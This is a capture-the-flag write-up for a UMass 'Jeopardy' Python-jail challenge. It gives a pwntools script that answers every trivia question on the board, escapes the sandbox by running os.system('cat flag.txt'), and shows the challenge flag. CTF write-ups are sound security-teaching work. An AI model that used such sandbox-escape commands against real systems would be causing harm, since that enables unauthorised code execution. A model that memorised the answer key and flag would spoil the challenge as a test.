# Jeopardy
**Category: Misc**

This challenge was a pyjail escape, where you had to answer cybersecurity related jeopardy questions to unlock characters you can use to escape:

```
$ nc 35.231.20.75 8082
Welcome to python jail-pardy! Each correctly answered question grants you characters which you can use try to break out of this game with to get the flag.
When you answer a question correctly, the game will tell you which characters have been unlocked.
To attempt to breakout, instead of picking a question, type the word "jailbreak" instead.

    ----------------------------------------- Jeopardy! -----------------------------------------
    UMass:  Cybersecurity Now:  Cybersecurity Yesterday:  Cybersecurity Tomorrow:  Miscellaneous:
     100           100                     100                      100                 100
     200           200                     200                      200                 200
     300           300                     300                      300                 300
     400           400                     400                      400                 400
     500           500                     500                      500                 10000

Type "ready" when you are ready to play!
```

You have a choice to either solve some of the jeopardy and do a difficult jailbreak with the limited characters, or solve the whole board and do an easy jailbreak. I went for the solve the whole board approach.

This script will answer all the questions, and print the flag:

```python
#!/usr/bin/env python3
from pwn import *

DELAY = 0.01
r = remote('35.231.20.75', 8082)

answers = [
    ["UMass 500", "jolly roger"],
    ["Umass 400", "Orchard Hill"],
    ["Umass 300", "Franklin"],
    ["UMass 200", "food"],
    ["UMass 100", "sam"],

    ["Cybersecurity Now 500", "electronic sniffing dog"],
    ["Cybersecurity Now 400", "microsoft"],
    ["Cybersecurity Now 300", "radiohead"],
    ["Cybersecurity Now 200", "laser"],
    ["Cybersecurity Now 100", "39"],

    ["Cybersecurity Yesterday 500", "the orange book"],
    ["Cybersecurity Yesterday 400", "reaper"],
    ["Cybersecurity Yesterday 300", "iran"],
    ["Cybersecurity Yesterday 200", "WarGames"],
    ["Cybersecurity Yesterday 100", "captain crunch"],

    ["Cybersecurity Tomorrow 500", "deepfake"],
    ["Cybersecurity Tomorrow 400", "arm"],
    ["Cybersecurity Tomorrow 300", "human"],
    ["Cybersecurity Tomorrow 200", "2038"],
    ["Cybersecurity Tomorrow 100", "quantum"],

    ["Miscellaneous 10000", "gSH1GgcJHimHy0XaMn"],
    ["Miscellaneous 400", "4"],
    ["Miscellaneous 300", "101010"],
    ["Miscellaneous 200", "ios"],
    ["Miscellaneous 100", "Akamai"]
]

log.info(r.recvuntilS('ready to play!'))
r.sendline('ready')
log.info(r.recvrepeat(DELAY))
for answer in answers:
    r.sendline(answer[0])
    log.info(r.recvuntil('Your answer:'))
    log.info(answer[1])
    r.sendline(answer[1])
    log.info(r.recvrepeat(DELAY))

for code in ['import os', "os.system('cat flag.txt')"]:
    r.sendline('jailbreak')
    log.info(r.recvuntil('>>> '))
    log.info(code)
    r.sendline(code)

r.interactive() # UMASS{thank-you-alex}

```